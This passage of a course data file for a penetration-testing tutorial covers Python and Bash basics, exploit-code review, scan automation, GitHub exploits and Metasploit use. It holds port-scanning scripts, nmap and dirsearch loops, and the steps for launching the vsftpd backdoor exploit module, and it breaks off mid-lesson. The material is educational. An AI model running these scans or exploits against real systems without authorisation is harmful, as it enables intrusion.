    s = socket.socket()
    if s.connect_ex((target, port)) == 0:
        print(f"Port {port} is open")
    s.close()</pre>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 4. Read data from file (e.g., for brute force)</span>
                  <pre class="text-blue-400 font-mono text-sm bg-black/30 p-2 rounded">
with open("usernames.txt") as f:
    users = f.read().splitlines()</pre>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 5. Write output to log file</span>
                  <pre class="text-blue-400 font-mono text-sm bg-black/30 p-2 rounded">
with open("scan_results.txt", "w") as f:
    f.write("Port 22 open\n")</pre>
                </div>
              </div>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="text-white font-medium mb-3">Tool 2: Bash (Automation & System Tasks)</h4>
              <div class="space-y-3">
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 1. Check current user</span>
                  <code class="text-green-400 block font-mono text-sm">whoami</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 2. Loop through IP range</span>
                  <code class="text-green-400 block font-mono text-sm">for ip in 192.168.1.{1..50}; do ping -c 1 $ip; done</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 3. Automate Nmap scan</span>
                  <code class="text-green-400 block font-mono text-sm">for ip in 192.168.1.{1..50}; do nmap -sV $ip >> nmap_results.txt; done</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 4. Extract lines matching vulnerability pattern</span>
                  <code class="text-green-400 block font-mono text-sm">grep "VULN" scan.txt</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 5. Schedule script with cron</span>
                  <div class="text-green-400 font-mono text-sm">
                    <code>crontab -e</code>
                    <div class="mt-1 text-gray-500 text-xs"># Add: 0 2 * * * /home/user/scan.sh</div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div class="bg-blue-900/20 p-4 rounded border-l-4 border-blue-500">
            <h3 class="text-lg font-semibold text-white mb-2">Professional Insight</h3>
            <p class="text-gray-300 text-sm mb-2">
              Python is excellent for networking, APIs, and exploit scripts. Bash is powerful for system automation and quick tasks.
            </p>
            <p class="text-gray-300 text-sm">
              Scripting skills allow customization beyond what off-the-shelf tools offer.
            </p>
          </div>

          <div class="bg-green-900/20 p-4 rounded border-l-4 border-green-500">
            <h3 class="text-lg font-semibold text-white mb-2">Key Takeaway</h3>
            <p class="text-gray-300 text-sm mb-2">
              Scripting is the backbone of modern cybersecurity automation.
            </p>
            <p class="text-gray-300 text-sm">
              Even small scripts can save hours and expand capabilities in penetration testing.
            </p>
          </div>
        </div>`,
        duration: '15 min'
      },
      {
        title: 'Understanding Python & Bash Basics',
        content: `<div class="space-y-6">
          <div>
            <h2 class="text-xl font-semibold mb-3 text-white">Understanding Python & Bash Basics</h2>
            <p class="mb-4 text-gray-300">
              Python and Bash are the two most important scripting languages in cybersecurity. Almost every security tool either uses them internally or allows integration through scripts.
            </p>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
              <div class="bg-[#252526] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold text-blue-400 mb-2">Python</h3>
                <p class="text-gray-300 text-sm">Logic, networking, APIs, exploit development.</p>
              </div>
              <div class="bg-[#252526] p-4 rounded border border-[#333]">
                <h3 class="text-lg font-semibold text-green-400 mb-2">Bash</h3>
                <p class="text-gray-300 text-sm">System automation, chaining tools, quick enumeration.</p>
              </div>
            </div>
            <p class="mb-4 text-gray-300">
              A strong security professional knows when to use which.
            </p>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Why Python & Bash Are Critical</h3>
            <ul class="list-disc list-inside space-y-2 text-gray-300">
              <li><span class="text-white font-medium">Native support</span> in Kali Linux.</li>
              <li>Used in tools like <span class="text-white font-medium">Nmap, Metasploit, SQLMap, LinPEAS</span>.</li>
              <li>Perfect for automation, parsing output, and custom payloads.</li>
              <li>Bash handles OS-level tasks; Python handles logic-heavy tasks.</li>
            </ul>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Python vs Bash (Mental Model)</h3>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <h4 class="text-green-400 font-medium mb-2">Use Bash when:</h4>
                <ul class="list-disc list-inside space-y-1 text-gray-300 text-sm">
                  <li>Automating OS commands</li>
                  <li>Chaining tools</li>
                  <li>Quick one-liners</li>
                </ul>
              </div>
              <div>
                <h4 class="text-blue-400 font-medium mb-2">Use Python when:</h4>
                <ul class="list-disc list-inside space-y-1 text-gray-300 text-sm">
                  <li>Working with sockets</li>
                  <li>Writing scanners or exploits</li>
                  <li>Parsing complex data (JSON, HTML, APIs)</li>
                </ul>
              </div>
            </div>
          </div>

          <h3 class="text-lg font-semibold text-white mt-6 mb-3">Syntax (Python & Bash Basics for Cyber Security)</h3>
          
          <div class="space-y-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="text-blue-400 font-medium mb-3">Tool 1: Python (Core Basics for Security)</h4>
              <div class="space-y-3">
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 1. Check Python version</span>
                  <code class="text-blue-400 block font-mono text-sm">python3 --version</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 2. Variables and printing</span>
                  <pre class="text-blue-400 font-mono text-sm bg-black/30 p-2 rounded">
ip = "192.168.1.10"
print("Target IP:", ip)</pre>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 3. Conditional logic</span>
                  <pre class="text-blue-400 font-mono text-sm bg-black/30 p-2 rounded">
if ip.startswith("192.168"):
    print("Internal network detected")</pre>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 4. Loop through ports</span>
                  <pre class="text-blue-400 font-mono text-sm bg-black/30 p-2 rounded">
for port in range(20, 26):
    print("Checking port", port)</pre>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 5. Simple socket connection test</span>
                  <pre class="text-blue-400 font-mono text-sm bg-black/30 p-2 rounded">
import socket
s = socket.socket()
result = s.connect_ex(("192.168.1.10", 22))
if result == 0:
    print("SSH port open")
s.close()</pre>
                </div>
              </div>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="text-green-400 font-medium mb-3">Tool 2: Bash (Core Basics for Security)</h4>
              <div class="space-y-3">
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 1. Variables</span>
                  <pre class="text-green-400 font-mono text-sm bg-black/30 p-2 rounded">
TARGET="192.168.1.10"
echo $TARGET</pre>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 2. Conditional check</span>
                  <pre class="text-green-400 font-mono text-sm bg-black/30 p-2 rounded">
if ping -c 1 $TARGET; then
  echo "Host is alive"
fi</pre>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 3. Loop through ports using netcat</span>
                  <code class="text-green-400 block font-mono text-sm">for port in 22 80 443; do nc -zv $TARGET $port; done</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 4. Command substitution</span>
                  <pre class="text-green-400 font-mono text-sm bg-black/30 p-2 rounded">
OPEN_PORTS=$(nmap -p 22,80 $TARGET | grep open)
echo "$OPEN_PORTS"</pre>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 5. Redirect output to file</span>
                  <code class="text-green-400 block font-mono text-sm">nmap -sV $TARGET > scan_results.txt</code>
                </div>
              </div>
            </div>
          </div>

          <div class="bg-blue-900/20 p-4 rounded border-l-4 border-blue-500">
            <h3 class="text-lg font-semibold text-white mb-2">Security Insight</h3>
            <p class="text-gray-300 text-sm mb-2">
              Most real-world pentesters:
            </p>
            <ul class="list-disc list-inside space-y-1 text-gray-300 text-sm">
              <li>Use Bash to glue tools together.</li>
              <li>Use Python when Bash becomes messy or limited.</li>
            </ul>
            <p class="text-gray-300 text-sm mt-2">
              Mastering both gives you speed + power.
            </p>
          </div>

          <div class="bg-green-900/20 p-4 rounded border-l-4 border-green-500">
            <h3 class="text-lg font-semibold text-white mb-2">Key Takeaway</h3>
            <p class="text-gray-300 text-sm mb-2">
              Python gives you brains. Bash gives you speed.
            </p>
            <p class="text-gray-300 text-sm">
              Cybersecurity needs both.
            </p>
          </div>
        </div>`,
        duration: '15 min'
      },
      {
        title: 'Analyzing Exploit Code',
        content: `<div class="space-y-6">
          <div>
            <h2 class="text-xl font-semibold mb-3 text-white">Analyzing Exploit Code</h2>
            <p class="mb-4 text-gray-300">
              Analyzing exploit code is a core defensive and offensive skill in cyber security. You are not blindly running exploits — you are reading, understanding, and validating what the exploit actually does.
            </p>
            <p class="mb-4 text-gray-300">
              A professional pentester or security analyst always:
            </p>
            <ul class="list-disc list-inside space-y-2 text-gray-300 mb-4">
              <li><span class="text-white font-medium">Verifies what vulnerability is targeted</span></li>
              <li><span class="text-white font-medium">Checks payload behavior</span></li>
              <li><span class="text-white font-medium">Identifies hardcoded IPs, ports, shells</span></li>
              <li><span class="text-white font-medium">Modifies exploits safely if required</span></li>
            </ul>
          </div>

          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-white mb-2">Why Exploit Analysis Matters</h3>
              <ul class="list-disc list-inside space-y-2 text-gray-300 text-sm">
                <li>Many public exploits are outdated or unsafe.</li>
                <li>Some exploits contain malicious backdoors.</li>
                <li>Real-world engagements require customization.</li>
                <li>Blue teams analyze exploit code to write detections.</li>
              </ul>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-white mb-2">What to Look for</h3>
              <ul class="list-disc list-inside space-y-2 text-gray-300 text-sm">
                <li>Vulnerability type (buffer overflow, RCE, SQLi, LFI).</li>
                <li>Target application & version.</li>
                <li>Payload logic.</li>
                <li>Network callbacks (reverse shell IP/port).</li>
                <li>Dangerous system calls.</li>
              </ul>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Common Exploit Code Formats</h3>
            <div class="flex flex-wrap gap-2">
              <span class="px-2 py-1 bg-[#252526] text-blue-400 rounded text-sm border border-[#333]">Python (.py)</span>
              <span class="px-2 py-1 bg-[#252526] text-gray-300 rounded text-sm border border-[#333]">C (.c)</span>
              <span class="px-2 py-1 bg-[#252526] text-red-400 rounded text-sm border border-[#333]">Ruby (.rb)</span>
              <span class="px-2 py-1 bg-[#252526] text-green-400 rounded text-sm border border-[#333]">Bash (.sh)</span>
              <span class="px-2 py-1 bg-[#252526] text-purple-400 rounded text-sm border border-[#333]">Metasploit (.rb)</span>
            </div>
          </div>

          <h3 class="text-lg font-semibold text-white mt-6 mb-3">Syntax (Exploit Code Analysis Tools)</h3>
          
          <div class="space-y-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="text-white font-medium mb-3">Tool 1: Searchsploit (Exploit Database Analysis)</h4>
              <div class="space-y-3">
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 1. Search exploits by software name</span>
                  <code class="text-green-400 block font-mono text-sm">searchsploit apache 2.4</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 2. View exploit code without executing</span>
                  <code class="text-green-400 block font-mono text-sm">searchsploit -x exploits/linux/local/45010.c</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 3. Copy exploit locally for analysis</span>
                  <code class="text-green-400 block font-mono text-sm">searchsploit -m exploits/windows/remote/42031.py</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 4. Search exploits by CVE</span>
                  <code class="text-green-400 block font-mono text-sm">searchsploit CVE-2021-41773</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 5. Examine exploit references</span>
                  <code class="text-green-400 block font-mono text-sm">searchsploit --www apache</code>
                </div>
                <div class="mt-2 text-yellow-400 text-xs font-semibold">
                  📌 Best Practice: Always open exploit files in a text editor before use.
                </div>
              </div>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="text-white font-medium mb-3">Tool 2: Metasploit (Module Code Analysis)</h4>
              <div class="space-y-3">
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 1. Start Metasploit</span>
                  <code class="text-blue-400 block font-mono text-sm">msfconsole</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 2. Search for an exploit module</span>
                  <code class="text-blue-400 block font-mono text-sm">search type:exploit apache</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 3. Locate module file path</span>
                  <code class="text-blue-400 block font-mono text-sm">info exploit/linux/http/apache_mod_cgi_bash_env_exec</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 4. Open exploit source code</span>
                  <code class="text-blue-400 block font-mono text-sm">nano /usr/share/metasploit-framework/modules/exploits/linux/http/apache_mod_cgi_bash_env_exec.rb</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 5. Read payload and target logic</span>
                  <code class="text-blue-400 block font-mono text-sm">grep -n "payload" /usr/share/metasploit-framework/modules/exploits/linux/http/apache_mod_cgi_bash_env_exec.rb</code>
                </div>
                <div class="mt-2 text-blue-300 text-xs font-semibold">
                  📌 Key Insight: Metasploit modules are clean, audited, and readable, making them perfect for learning exploit structure.
                </div>
              </div>
            </div>
          </div>

          <div class="bg-blue-900/20 p-4 rounded border-l-4 border-blue-500">
            <h3 class="text-lg font-semibold text-white mb-2">Security Insight</h3>
            <p class="text-gray-300 text-sm mb-2">
              Never trust exploit code blindly. Always ask:
            </p>
            <ul class="list-disc list-inside space-y-1 text-gray-300 text-sm mb-2">
              <li>What does this code execute?</li>
              <li>Where does the shell connect?</li>
              <li>Can it damage the system?</li>
            </ul>
            <p class="text-gray-300 text-sm">
              Exploit analysis separates script kiddies from security engineers.
            </p>
          </div>

          <div class="bg-green-900/20 p-4 rounded border-l-4 border-green-500">
            <h3 class="text-lg font-semibold text-white mb-2">Key Takeaway</h3>
            <p class="text-gray-300 text-sm mb-2">
              Exploit execution = risk. Exploit analysis = control.
            </p>
            <p class="text-gray-300 text-sm">
              Understand the code before touching the target.
            </p>
          </div>
        </div>`,
        duration: '15 min'
      },
      {
        title: 'Common Automation Scripts for Pentesting',
        content: `<div class="space-y-6">
          <div>
            <h2 class="text-xl font-semibold mb-3 text-white">Common Automation Scripts for Pentesting</h2>
            <p class="mb-4 text-gray-300">
              Automation is what allows pentesters to work fast, consistently, and at scale. Instead of manually running the same commands again and again, automation scripts help you:
            </p>
            <ul class="list-disc list-inside space-y-2 text-gray-300 mb-4">
              <li><span class="text-white font-medium">Reduce human error</span></li>
              <li><span class="text-white font-medium">Save time during engagements</span></li>
              <li><span class="text-white font-medium">Standardize recon and scanning</span></li>
              <li><span class="text-white font-medium">Focus on analysis instead of repetition</span></li>
            </ul>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Most Real-World Pentesting Automation</h3>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <h4 class="text-green-400 font-medium mb-2">Bash</h4>
                <p class="text-gray-300 text-sm">Fast OS-level automation.</p>
              </div>
              <div>
                <h4 class="text-blue-400 font-medium mb-2">Python</h4>
                <p class="text-gray-300 text-sm">Logic-heavy, flexible automation.</p>
              </div>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Characteristics of a Good Pentest Script</h3>
            <ul class="list-disc list-inside space-y-2 text-gray-300 text-sm">
              <li>Modular and readable.</li>
              <li>Accepts input dynamically.</li>
              <li>Logs output properly.</li>
              <li>Handles errors gracefully.</li>
              <li>Avoids destructive actions.</li>
            </ul>
          </div>

          <h3 class="text-lg font-semibold text-white mt-6 mb-3">Syntax (Pentesting Automation Tools)</h3>
          
          <div class="space-y-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="text-green-400 font-medium mb-3">Tool 1: Bash Automation Scripts</h4>
              <div class="space-y-3">
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 1. Automated target ping check</span>
                  <pre class="text-green-400 font-mono text-sm bg-black/30 p-2 rounded">
#!/bin/bash
TARGET=$1
ping -c 1 $TARGET > /dev/null && echo "Host is alive"</pre>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 2. Automated port scan using Nmap</span>
                  <code class="text-green-400 block font-mono text-sm">nmap -p- --min-rate 1000 $TARGET -oN ports.txt</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 3. Service enumeration</span>
                  <code class="text-green-400 block font-mono text-sm">nmap -sV -p $(cat ports.txt | grep open | cut -d/ -f1 | tr '\n' ',') $TARGET</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 4. Directory brute force automation</span>
                  <code class="text-green-400 block font-mono text-sm">dirsearch -u http://$TARGET -o dirs.txt</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 5. Combine tools in one flow</span>
                  <code class="text-green-400 block font-mono text-sm">nmap -sC -sV $TARGET && nikto -h http://$TARGET</code>
                </div>
                <div class="mt-2 text-green-300 text-xs font-semibold">
                  📌 Insight: Bash scripts are perfect for gluing tools together.
                </div>
              </div>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="text-blue-400 font-medium mb-3">Tool 2: Python Automation Scripts</h4>
              <div class="space-y-3">
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 1. Create a Python recon script file</span>
                  <code class="text-blue-400 block font-mono text-sm">nano recon.py</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 2. Automated port scan using socket</span>
                  <pre class="text-blue-400 font-mono text-sm bg-black/30 p-2 rounded">
import socket
target = "192.168.1.10"

for port in range(20, 1025):
    s = socket.socket()
    s.settimeout(0.5)
    if s.connect_ex((target, port)) == 0:
        print("Open port:", port)
    s.close()</pre>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 3. Run OS commands from Python</span>
                  <pre class="text-blue-400 font-mono text-sm bg-black/30 p-2 rounded">
import os
os.system("nmap -sV " + target)</pre>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 4. Save scan results to file</span>
                  <pre class="text-blue-400 font-mono text-sm bg-black/30 p-2 rounded">
with open("results.txt", "w") as f:
    f.write("Scan completed")</pre>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 5. Add argument handling</span>
                  <pre class="text-blue-400 font-mono text-sm bg-black/30 p-2 rounded">
import sys
target = sys.argv[1]
print("Scanning", target)</pre>
                </div>
                <div class="mt-2 text-blue-300 text-xs font-semibold">
                  📌 Insight: Python scripts are more readable and scalable for complex logic.
                </div>
              </div>
            </div>
          </div>

          <div class="bg-blue-900/20 p-4 rounded border-l-4 border-blue-500">
            <h3 class="text-lg font-semibold text-white mb-2">Security Insight</h3>
            <p class="text-gray-300 text-sm mb-2">
              Over-automation without understanding:
            </p>
            <ul class="list-disc list-inside space-y-1 text-gray-300 text-sm mb-2">
              <li>Misses context</li>
              <li>Creates false positives</li>
              <li>Can crash systems</li>
            </ul>
            <p class="text-gray-300 text-sm">
              Smart pentesters automate tasks, not decisions.
            </p>
          </div>

          <div class="bg-green-900/20 p-4 rounded border-l-4 border-green-500">
            <h3 class="text-lg font-semibold text-white mb-2">Key Takeaway</h3>
            <p class="text-gray-300 text-sm mb-2">
              Bash = speed. Python = control.
            </p>
            <p class="text-gray-300 text-sm">
              Use both to become efficient, not reckless.
            </p>
          </div>
        </div>`,
        duration: '15 min'
      },
      {
        title: 'Working with GitHub Exploits',
        content: `<div class="space-y-6">
          <div>
            <h2 class="text-xl font-semibold mb-3 text-white">Working with GitHub Exploits</h2>
            <p class="mb-4 text-gray-300">
              GitHub is one of the largest repositories of exploit code, PoCs, and security research. Modern pentesters and bug bounty hunters rely heavily on GitHub for:
            </p>
            <ul class="list-disc list-inside space-y-2 text-gray-300 mb-4">
              <li><span class="text-white font-medium">Proof-of-Concept (PoC) exploits</span></li>
              <li><span class="text-white font-medium">Custom attack scripts</span></li>
              <li><span class="text-white font-medium">Research on newly disclosed CVEs</span></li>
              <li><span class="text-white font-medium">Payload and bypass techniques</span></li>
            </ul>
            <p class="text-yellow-400 text-sm font-semibold border-l-4 border-yellow-400 pl-3">
              However, GitHub exploits are unverified and must always be treated with caution.
            </p>
          </div>

          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-green-400 mb-2">Why GitHub Exploits Are Important</h3>
              <ul class="list-disc list-inside space-y-1 text-gray-300 text-sm">
                <li>Faster than Exploit‑DB for new vulnerabilities</li>
                <li>Often includes detailed write‑ups</li>
                <li>Shows real-world exploit logic</li>
                <li>Helps understand bypass techniques</li>
              </ul>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-red-400 mb-2">Risks of Using GitHub Exploits</h3>
              <ul class="list-disc list-inside space-y-1 text-gray-300 text-sm">
                <li>Malicious backdoors</li>
                <li>Hardcoded reverse shells</li>
                <li>Fake PoCs</li>
                <li>Incompatible target versions</li>
              </ul>
              <div class="mt-2 text-red-300 text-xs font-semibold">
                📌 Rule: Never execute before reading.
              </div>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">How to Safely Work with GitHub Exploits</h3>
            <ul class="list-disc list-inside space-y-2 text-gray-300 text-sm">
              <li><span class="text-white font-medium">Read README.md</span> – Understand prerequisites and usage.</li>
              <li><span class="text-white font-medium">Review source code fully</span> – Don't run blindly.</li>
              <li><span class="text-white font-medium">Search for dangerous calls</span> – Look for <code>os.system</code>, <code>subprocess</code>, <code>curl</code>, <code>wget</code>.</li>
              <li><span class="text-white font-medium">Test in lab environments only</span> – Never run directly on production.</li>
              <li><span class="text-white font-medium">Modify IPs, ports, and payloads</span> – Customize for your target.</li>
            </ul>
          </div>

          <h3 class="text-lg font-semibold text-white mt-6 mb-3">Syntax (Tools for Working with GitHub Exploits)</h3>
          
          <div class="space-y-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="text-green-400 font-medium mb-3">Tool 1: Git (Exploit Retrieval & Management)</h4>
              <div class="space-y-3">
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 1. Clone an exploit repository</span>
                  <code class="text-green-400 block font-mono text-sm">git clone https://github.com/example/exploit-repo.git</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 2. Navigate into repository</span>
                  <code class="text-green-400 block font-mono text-sm">cd exploit-repo</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 3. View commit history</span>
                  <code class="text-green-400 block font-mono text-sm">git log --oneline</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 4. Check changed files</span>
                  <code class="text-green-400 block font-mono text-sm">git diff</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 5. Pull latest updates</span>
                  <code class="text-green-400 block font-mono text-sm">git pull</code>
                </div>
                <div class="mt-2 text-green-300 text-xs font-semibold">
                  📌 Insight: Commit history often reveals bug fixes or exploit reliability issues.
                </div>
              </div>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="text-blue-400 font-medium mb-3">Tool 2: GitHub CLI (gh) – Advanced Usage</h4>
              <div class="space-y-3">
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 1. Install GitHub CLI</span>
                  <code class="text-blue-400 block font-mono text-sm">sudo apt install gh</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 2. Authenticate GitHub account</span>
                  <code class="text-blue-400 block font-mono text-sm">gh auth login</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 3. Search exploit repositories</span>
                  <code class="text-blue-400 block font-mono text-sm">gh search repos CVE-2024 language:python</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 4. Clone directly using gh</span>
                  <code class="text-blue-400 block font-mono text-sm">gh repo clone username/repo-name</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 5. View repository issues</span>
                  <code class="text-blue-400 block font-mono text-sm">gh issue list</code>
                </div>
                <div class="mt-2 text-blue-300 text-xs font-semibold">
                  📌 Insight: Issues section often contains failed exploit reports and fixes.
                </div>
              </div>
            </div>
          </div>

          <div class="bg-blue-900/20 p-4 rounded border-l-4 border-blue-500">
            <h3 class="text-lg font-semibold text-white mb-2">Security Insight</h3>
            <p class="text-gray-300 text-sm mb-2">
              If you don’t understand the exploit code:
            </p>
            <ul class="list-disc list-inside space-y-1 text-gray-300 text-sm mb-2">
              <li>You don’t control it</li>
              <li>You don’t own the outcome</li>
            </ul>
            <p class="text-gray-300 text-sm">
              Reading exploit code is part of the attack chain.
            </p>
          </div>

          <div class="bg-green-900/20 p-4 rounded border-l-4 border-green-500">
            <h3 class="text-lg font-semibold text-white mb-2">Key Takeaway</h3>
            <p class="text-gray-300 text-sm mb-2">
              GitHub gives speed. Your analysis gives safety.
            </p>
            <p class="text-gray-300 text-sm">
              Exploit responsibly.
            </p>
          </div>
        </div>`,
        duration: '15 min'
      },
      {
        title: 'Using Metasploit Modules',
        content: `<div class="space-y-6">
          <div>
            <h2 class="text-xl font-semibold mb-3 text-white">Using Metasploit Modules</h2>
            <p class="mb-4 text-gray-300">
              Metasploit is a professional exploitation framework used by penetration testers, red teams, and security researchers. Unlike random scripts, Metasploit modules are:
            </p>
            <ul class="list-disc list-inside space-y-2 text-gray-300 mb-4">
              <li><span class="text-white font-medium">Structured</span> – Consistent interface for all exploits.</li>
              <li><span class="text-white font-medium">Maintained</span> – Regularly updated by the community.</li>
              <li><span class="text-white font-medium">Well‑documented</span> – Includes info on targets and reliability.</li>
              <li><span class="text-white font-medium">Safer to use</span> – Designed to avoid crashing services.</li>
            </ul>
            <p class="mb-4 text-gray-300">
              Metasploit allows you to search, configure, launch, and analyze exploits in a controlled way.
            </p>
          </div>

          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-white mb-2">Types of Metasploit Modules</h3>
              <ul class="space-y-2 text-gray-300 text-sm">
                <li><span class="text-red-400 font-mono">Exploit</span> → Triggers a vulnerability.</li>
                <li><span class="text-blue-400 font-mono">Payload</span> → Code executed after exploitation.</li>
                <li><span class="text-yellow-400 font-mono">Auxiliary</span> → Scanning, brute force, enumeration.</li>
                <li><span class="text-purple-400 font-mono">Post</span> → Post‑exploitation tasks.</li>
                <li><span class="text-green-400 font-mono">Encoder / NOP</span> → Obfuscation and shellcode handling.</li>
              </ul>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-white mb-2">Why Use Metasploit</h3>
              <ul class="list-disc list-inside space-y-1 text-gray-300 text-sm">
                <li>Reliable payload handling</li>
                <li>Built‑in session management</li>
                <li>Easy pivoting & post‑exploitation</li>
                <li>Extensive exploit library</li>
              </ul>
              <div class="mt-2 text-yellow-300 text-xs font-semibold">
                📌 Reality: Metasploit does not hack by itself — you do.
              </div>
            </div>
          </div>

          <h3 class="text-lg font-semibold text-white mt-6 mb-3">Syntax (Metasploit Module Usage)</h3>
          
          <div class="space-y-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="text-green-400 font-medium mb-3">Tool 1: Metasploit Framework (msfconsole)</h4>
              <div class="space-y-3">
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 1. Launch Metasploit</span>
                  <code class="text-green-400 block font-mono text-sm">msfconsole</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 2. Search for an exploit module</span>
                  <code class="text-green-400 block font-mono text-sm">search type:exploit name:vsftpd</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 3. Select an exploit</span>
                  <code class="text-green-400 block font-mono text-sm">use exploit/unix/ftp/vsftpd_234_backdoor</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 4. Show required options</span>
                  <code class="text-green-400 block font-mono text-sm">show options</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 5. Set target parameters</span>
                  <code class="text-green-400 block font-mono text-sm">set RHOSTS 192.168.1.10</code>
                  <code class="text-green-400 block font-mono text-sm mt-1">set RPORT 21</code>
                </div>
              </div>
            </div>

            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="text-blue-400 font-medium mb-3">Tool 2: Payload & Session Management</h4>
              <div class="space-y-3">
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 1. Show compatible payloads</span>
                  <code class="text-blue-400 block font-mono text-sm">show payloads</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 2. Set a payload</span>
                  <code class="text-blue-400 block font-mono text-sm">set PAYLOAD cmd/unix/interact</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 3. Run the exploit</span>
                  <code class="text-blue-400 block font-mono text-sm">run</code>
                </div>
                <div>
                  <span class="text-gray-500 text-xs block mb-1"># 4. List active sessions</span>
